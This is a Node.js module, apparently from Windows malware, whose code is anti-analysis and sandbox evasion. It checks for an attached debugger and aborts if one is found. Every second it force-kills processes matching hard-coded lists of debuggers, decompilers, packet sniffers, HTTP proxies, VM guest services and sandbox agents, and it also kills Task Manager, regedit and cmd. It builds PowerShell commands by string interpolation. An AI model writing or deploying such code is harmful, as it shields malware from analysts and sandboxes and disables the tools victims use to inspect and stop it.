const child_process = require("child_process");

const TerminateProcess = (pid) => {
 return new Promise((resolve, reject) => {
  try {
   child_process.exec(`powershell Stop-Process -Id ${pid} -Force`, (error, _stdout, _stderr) => {
    if (!error) {
     resolve(pid);
    } else {
     reject(error);
    }
   });
  } catch (error) {
   reject(error);
  }
 });
};

const KillProcessesByNames = (blacklist) => {
 return new Promise((resolve, reject) => {
  try {
   const blacklistRegex = blacklist.map((name) => name.toLowerCase()).join("|");
   child_process.exec(`powershell "Get-Process | Where-Object { $_.Name -match '${blacklistRegex}' } | ForEach-Object { Stop-Process -Id $_.Id -Force }"`, (error, stdout, stderr) => {
    if (!error) {
     resolve("Finish Process");
    } else {
     reject(error);
    }
   });
  } catch (error) {
   reject(error);
  }
 });
};

const GetWindowProcesses = () => {
 return new Promise((resolve, reject) => {
  try {
   child_process.exec(`powershell "(Get-Process | Where-Object { $_.MainWindowTitle -ne '' }) | ForEach-Object { $_.Id, $_.MainWindowTitle }"`, (error, stdout, stderr) => {
    if (!error) {
     const processInfo = stdout
      .split("\n")
      .map((line) => line.trim())
      .filter(Boolean);
     resolve(processInfo);
    } else {
     reject(error);
    }
   });
  } catch (error) {
   reject(error);
  }
 });
};

const KillProcessesByWindowNames = async (blacklist) => {
 try {
  const processes = await GetWindowProcesses();
  processes.forEach((processInfo, index) => {
   if (index % 2 !== 0) {
    const title = processInfo.toLowerCase();
    const pid = processes[index - 1];
    blacklist.forEach(async (name) => {
     if (title.includes(name)) {
      try {
       await TerminateProcess(pid);
      } catch (_error) {}
     }
    });
   }
  });
 } catch (error) {
  console.error(error);
 }
};

const IsDebuggerPresent = () => {
 return new Promise((resolve, reject) => {
  try {
   child_process.exec('powershell "[System.Diagnostics.Debugger]::IsAttached"', (error, stdout, stderr) => {
    if (!error) {
     resolve(stdout.trim() === "True");
    } else {
     reject(error);
    }
   });
  } catch (error) {
   reject(error);
  }
 });
};

module.exports = async () => {
 const windowBlacklist = ["process monitor", "protection_id", "de4dotmodded", "x32_dbg", "pizza", "fiddler", "x64_dbg", "httpanalyzer", "strongod", "wireshark", "gdb", "graywolf", "x64dbg", "ksdumper v1.1 - by equifox", "wpe pro", "ilspy", "dbx", "ollydbg", "x64netdumper", "system explorer", "mdbg", "kdb", "charles", "stringdecryptor", "phantom", "debugger", "extremedumper", "pc-ret", "folderchangesview", "james", "simpleassemblyexplorer", "dojandqwklndoqwd", "procmon64", "process hacker", "scyllahide", "kgdb", "systemexplorer", "proxifier", "debug", "httpdebug", "httpdebugger", "0harmony", "mitmproxy", "ida -", "codecracker", "ghidra", "titanhide", "hxd", "reversal", "sharpod", "http debugger", "dbgclr", "x32dbg", "sniffer", "petools", "simpleassembly", "ksdumper", "dnspy", "x96dbg", "de4dot", "exeinfope", "windbg", "mdb", "harmony", "systemexplorerservice", "megadumper"];

 const blacklist = ["ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice", "wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc", "vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice", "qemu-ga", "prl_cc", "prl_tools", "cmd", "joeboxcontrol", "vmacthlp", "httpdebuggerui", "processhacker", "joeboxserver", "fakenet", "ksdumper", "vmwareuser", "fiddler", "x96dbg", "dumpcap", "vboxservice"];

 try {
  if (await IsDebuggerPresent()) {
   process.abort();
  }

  setInterval(async () => {
   await KillProcessesByWindowNames(windowBlacklist);
   await KillProcessesByNames(blacklist);
  }, 1000);
 } catch (error) {
  console.error(error);
 }
};
